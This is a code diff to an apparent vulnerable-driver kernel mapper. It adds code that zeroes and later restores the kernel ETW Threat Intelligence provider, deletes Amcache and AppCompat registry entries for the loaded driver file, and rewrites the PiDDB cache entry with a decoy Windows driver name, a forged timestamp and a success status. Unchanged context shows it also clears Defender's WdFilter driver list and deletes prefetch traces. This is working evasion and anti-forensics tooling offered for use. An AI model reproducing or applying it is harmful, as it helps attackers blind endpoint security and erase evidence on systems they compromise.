@@ -209,6 +209,10 @@ static void RestoreUsermodeEtw() {
 	g_EtwPatched = false;
 }
 
+static uint64_t g_etwTiEnableOffset = 0;
+static uint32_t g_etwTiOriginalValue = 0;
+static bool     g_etwTiWasDisabled = false;
+
 static bool DisableKernelEtwTi() {
 	if (!vdrv::runtimeReady)
 		return false;
@@ -236,7 +240,6 @@ static bool DisableKernelEtwTi() {
 		return false;
 
 	uint64_t provRegHandle = guidAddr - 0x20;
-
 	uint64_t enableOffset = provRegHandle + 0x30;
 
 	uint32_t enableInfo = 0;
@@ -246,11 +249,30 @@ static bool DisableKernelEtwTi() {
 	if (enableInfo == 0)
 		return true;
 
+	g_etwTiEnableOffset = enableOffset;
+	g_etwTiOriginalValue = enableInfo;
+	g_etwTiWasDisabled = true;
+
 	uint32_t zero = 0;
-	if (!vdrv::WriteMemory(enableOffset, &zero, sizeof(zero)))
+	if (!vdrv::WriteMemory(enableOffset, &zero, sizeof(zero))) {
+		g_etwTiWasDisabled = false;
 		return false;
+	}
 
 	return true;
+}
+
+static bool RestoreKernelEtwTi() {
+	if (!g_etwTiWasDisabled || !g_etwTiEnableOffset || !vdrv::runtimeReady)
+		return false;
+
+	bool ok = vdrv::WriteMemory(g_etwTiEnableOffset, &g_etwTiOriginalValue, sizeof(g_etwTiOriginalValue));
+
+	g_etwTiWasDisabled = false;
+	g_etwTiEnableOffset = 0;
+	g_etwTiOriginalValue = 0;
+
+	return ok;
 }
 
 static size_t PatchSymlinkInBuffer(BYTE* buf, size_t size, const std::wstring& newName) {
@@ -392,6 +414,80 @@ static bool PatchDriverFile(const std::wstring& driver_path, ULONG32* out_timest
 		*out_symlink = L"";
 
 	return true;
+}
+
+static void CleanupAmcacheForFile(const std::wstring& driver_path) {
+	std::wstring filename;
+	try {
+		filename = std::filesystem::path(driver_path).filename().wstring();
+	}
+	catch (...) {
+		return;
+	}
+	if (filename.empty())
+		return;
+
+	static const wchar_t* amcache_roots[] = {
+		L"SOFTWARE\\Microsoft\\Amcache\\Root\\InventoryApplicationFile",
+		L"SOFTWARE\\Microsoft\\Amcache\\Root\\InventoryDriverBinary",
+		L"SOFTWARE\\Microsoft\\Amcache\\Root\\File",
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\InventoryApplicationFile",
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\InventoryDriverBinary",
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\File",
+	};
+
+	for (const wchar_t* amroot : amcache_roots) {
+		HKEY hRoot = NULL;
+		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, amroot, 0,
+			KEY_READ | KEY_WRITE | KEY_WOW64_64KEY, &hRoot) != ERROR_SUCCESS) {
+			continue;
+		}
+
+		DWORD subkey_count = 0;
+		DWORD max_name_len = 0;
+		if (RegQueryInfoKeyW(hRoot, nullptr, nullptr, nullptr, &subkey_count,
+			&max_name_len, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) {
+			RegCloseKey(hRoot);
+			continue;
+		}
+
+		if (subkey_count == 0) {
+			RegCloseKey(hRoot);
+			continue;
+		}
+
+		std::vector<std::wstring> to_delete;
+		max_name_len += 2;
+		auto name_buf = std::make_unique<wchar_t[]>(max_name_len);
+
+		for (DWORD i = 0; i < subkey_count; i++) {
+			DWORD name_sz = max_name_len;
+			if (RegEnumKeyExW(hRoot, i, name_buf.get(), &name_sz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
+				continue;
+
+			HKEY hChild;
+			if (RegOpenKeyExW(hRoot, name_buf.get(), 0, KEY_READ | KEY_WOW64_64KEY, &hChild) != ERROR_SUCCESS)
+				continue;
+
+			wchar_t low_filename[MAX_PATH];
+			DWORD low_sz = sizeof(low_filename);
+			if (RegQueryValueExW(hChild, L"LowerCaseLongPath", nullptr, nullptr,
+				reinterpret_cast<LPBYTE>(low_filename), &low_sz) == ERROR_SUCCESS) {
+				std::wstring lp(low_filename);
+				std::wstring filename_lower = filename;
+				std::transform(filename_lower.begin(), filename_lower.end(), filename_lower.begin(), ::towlower);
+				std::transform(lp.begin(), lp.end(), lp.begin(), ::towlower);
+				if (lp.find(filename_lower) != std::wstring::npos)
+					to_delete.push_back(name_buf.get());
+			}
+			RegCloseKey(hChild);
+		}
+
+		for (const auto& k : to_delete)
+			RegDeleteTreeW(hRoot, k.c_str());
+
+		RegCloseKey(hRoot);
+	}
 }
 
 static void CleanupPrefetch(const std::wstring& driver_path) {
@@ -882,6 +978,10 @@ bool vdrv::ClearWdFilterDriverList() {
 }
 
 NTSTATUS vdrv::Unload() {
+	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
+		RestoreKernelEtwTi();
+	}
+
 	runtimeReady = false;
 	kernel_MmGetPhysicalAddress = 0;
 	ntoskrnlPhysBase = 0;
@@ -900,6 +1000,7 @@ NTSTATUS vdrv::Unload() {
 	std::wstring driver_path = GetDriverPath();
 	if (!driver_path.empty()) {
 		CleanupPrefetch(driver_path);
+		CleanupAmcacheForFile(driver_path);
 		SecureDeleteFile(driver_path);
 	}
 
@@ -1230,48 +1331,48 @@ bool vdrv::ClearPiDDBCacheTable() {
 		return false;
 	}
 
-	PLIST_ENTRY prev;
-	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-	PLIST_ENTRY next;
-	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
+	static const wchar_t* decoy_names[] = {
+		L"NDProxy.sys",
+		L"mouhid.sys",
+		L"USBXHCI.sys",
+		L"wmbclass.sys",
+		L"netbt.sys",
+		L"BthHfEnum.sys",
+		L"HidUsb.sys",
+		L"swenum.sys",
+	};
+	const wchar_t* decoy = decoy_names[kdmUtils::CryptoRand32() % (sizeof(decoy_names) / sizeof(decoy_names[0]))];
+	size_t decoy_bytes = wcslen(decoy) * sizeof(wchar_t);
 
-	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-
-	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
+	UNICODE_STRING driver_name_us = { 0 };
+	if (!ReadMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, DriverName),
+		&driver_name_us, sizeof(UNICODE_STRING))) {
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
 
-	ULONG cacheDeleteCount = 0;
-	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
-	if (cacheDeleteCount > 0) {
-		cacheDeleteCount--;
-		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
+	if (driver_name_us.Buffer && decoy_bytes <= driver_name_us.MaximumLength) {
+		auto fill = std::make_unique<uint8_t[]>(driver_name_us.MaximumLength);
+		memcpy(fill.get(), decoy, decoy_bytes);
+		if (decoy_bytes < driver_name_us.MaximumLength) {
+			memset(fill.get() + decoy_bytes, 0, driver_name_us.MaximumLength - decoy_bytes);
+		}
+		WriteMemory((uintptr_t)driver_name_us.Buffer, fill.get(), driver_name_us.MaximumLength);
+
+		driver_name_us.Length = (USHORT)decoy_bytes;
+		WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, DriverName),
+			&driver_name_us, sizeof(UNICODE_STRING));
 	}
 
-	ULONG restartKeyBefore = 0;
-	ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &restartKeyBefore, sizeof(ULONG));
-	if (restartKeyBefore > 1) {
-		ULONG newKey = restartKeyBefore - 1;
-		WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &newKey, sizeof(ULONG));
-	}
+	ULONG realisticLow = 0x55000000u;
+	ULONG realisticHigh = 0x68c00000u;
+	ULONG forged_timestamp = realisticLow + (kdmUtils::CryptoRand32() % (realisticHigh - realisticLow));
+	WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, TimeDateStamp),
+		&forged_timestamp, sizeof(ULONG));
 
-	PVOID zeroPtr = nullptr;
-	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, OrderedPointer), &zeroPtr, sizeof(PVOID));
-	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, RestartKey), &zeroPtr, sizeof(PVOID));
+	NTSTATUS forged_status = STATUS_SUCCESS;
+	WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, LoadStatus),
+		&forged_status, sizeof(NTSTATUS));
 
 	ExReleaseResourceLite(PiDDBLock);
 	return true;
